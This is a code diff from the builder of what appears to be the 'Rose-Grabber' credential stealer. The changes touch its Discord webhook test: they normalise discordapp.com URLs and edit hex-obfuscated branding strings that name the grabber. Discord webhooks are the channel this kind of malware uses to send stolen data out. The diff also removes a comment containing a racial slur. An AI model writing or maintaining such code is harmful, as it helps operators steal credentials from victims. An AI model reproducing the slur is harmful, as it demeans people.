@@ -143,9 +143,17 @@ async def _test_webhook():
         return 
     ui.notify("Webhook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
 
+def replace_discord_url(url):
+    match = re.match(r"https:\/\/discordapp\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+", url)
+    if match:
+        new_url = match.group(0).replace('discordapp.com', 'discord.com')
+        return new_url
+    else:
+        return url
+
 async def test_webhook(webhook_url):
     try:
-        async with Webhook.Async(webhook_url) as hook:
+        async with Webhook.Async(replace_discord_url(webhook_url)) as hook:
             embed = Embed(
                 description='Webhook is Working',
                 color=11795068,
@@ -153,7 +161,7 @@ async def test_webhook(webhook_url):
             )
             embed.set_author(name="Success", icon_url=__icon__)
             embed.set_footer(text="Rose Builder | By pierro, suegdu, gumbobr0t, svn, Minecraft_killer", icon_url=__icon__)
-            await hook.send(embed=embed, username='\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72', avatar_url='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67')
+            await hook.send(embed=embed, username='\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72', avatar_url='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x52\x6f\x73\x65\x2e\x70\x6e\x67')
         return 0
     except Exception as e:
         logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
@@ -217,17 +225,6 @@ def _makebuild(q: Queue, data_builder) -> str:
             logger.info(f'Successfully copied all files from {cwd} to {path}')
         except Exception as e:
             logger.error(f"Error in get_files: {e}")
-
-    # chatgpt on top because the niggers from dhooks are too braindead to fix their shit (i am too lol)
-    def replace_discord_url(url):
-        # Check if the URL matches the pattern
-        match = re.match(r"https:\/\/discordapp\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+", url)
-        if match:
-        # Replace 'discordapp.com' with 'discord.com'
-            new_url = match.group(0).replace('discordapp.com', 'discord.com')
-            return new_url
-        else:
-            return url
 
     def edit_config():
         try:
